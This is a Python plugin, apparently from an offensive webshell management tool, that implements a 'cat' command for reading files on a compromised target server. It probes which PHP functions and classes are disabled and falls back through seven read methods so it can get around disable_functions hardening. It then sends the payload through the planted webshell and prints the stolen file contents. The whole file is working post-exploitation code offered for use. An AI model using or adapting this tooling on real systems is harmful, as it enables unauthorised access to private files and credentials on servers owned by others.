from libs.config import alias, color
from libs.myapp import send, base64_decode
from libs.functions.webshell_plugins.cat import gget, get_php_cat


@alias(True, func_alias="c", _type="FILE")
def run(*web_file_paths):
    """
    cat

    Read file(s) from target system.

    eg: cat {web_file_path1} {web_file_path2} ..
    """
    disable_func_list = gget("webshell.disable_functions", "webshell")
    disable_classes_list = gget("webshell.disable_classes", "webshell")
    loaded_ext_list = gget("webshell.loaded_ext", "webshell")
    read_method = 0
    if "file_get_contents" not in disable_func_list:
        read_method = 1
    elif "readfile" not in disable_func_list:
        read_method = 2
    elif not any((bool(each in disable_func_list) for each in ["fopen", "fread", "filesize"])):
        read_method = 3
    elif "DOMDocument" not in disable_classes_list and "dom" in loaded_ext_list:
        read_method = 4
    elif not any((bool(each in disable_func_list) for each in ["curl_init", "curl_setopt", "curl_exec"])) and "curl" in loaded_ext_list:
        read_method = 5
    elif "SplFileObject" not in disable_classes_list and "SPL" in loaded_ext_list:
        read_method = 6
    elif "zip" in loaded_ext_list:
        read_method = 7

    for each_file_path in web_file_paths:
        res = send(get_php_cat(each_file_path, read_method))
        if (not res):
            return
        text = res.r_text.strip()
        if len(text):
            print("\n" + color.green(each_file_path))
            if read_method == 3:
                text = base64_decode(text)
            print("\n" + text + "\n")
        else:
            print("\n" + color.yellow(each_file_path))
            print("\n" + color.red("File not exist / Read error") + "\n")
